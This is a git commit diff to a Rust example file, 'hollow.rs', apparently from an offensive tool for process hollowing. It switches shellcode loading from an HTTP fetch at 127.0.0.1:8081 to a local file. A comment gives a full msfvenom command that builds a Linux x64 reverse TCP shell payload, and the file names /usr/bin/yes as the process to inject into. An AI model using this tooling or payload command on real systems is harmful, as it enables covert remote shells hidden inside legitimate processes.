01a0da1a1037a1be0179da09f89be12677411bdb
dustyw0lf <dustyw0lf@users.noreply.github.com>
2024-10-16 15:38:00 +0300

    Refactor: Remove CLI crate

--- examples/hollow.rs
+++ examples/hollow.rs
@@ -11,10 +11,10 @@ fn main() {
 
     // Shellcode:
     // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
-    // let shellcode_location = format!("{}/shellcode.bin", cwd);
-    // let shellcode_bytes = get_binary_filesystem(&shellcode_location);
-    let shellcode_location = "http://127.0.0.1:8081/shellcode.bin";
-    let shellcode_bytes = get_binary_http(shellcode_location);
+    let shellcode_location = format!("{}/shellcode.bin", cwd);
+    let shellcode_bytes = get_binary_filesystem(&shellcode_location);
+    // let shellcode_location = "http://127.0.0.1:8081/shellcode.bin";
+    // let shellcode_bytes = get_binary_http(shellcode_location);
 
     let target = "/usr/bin/yes";
 
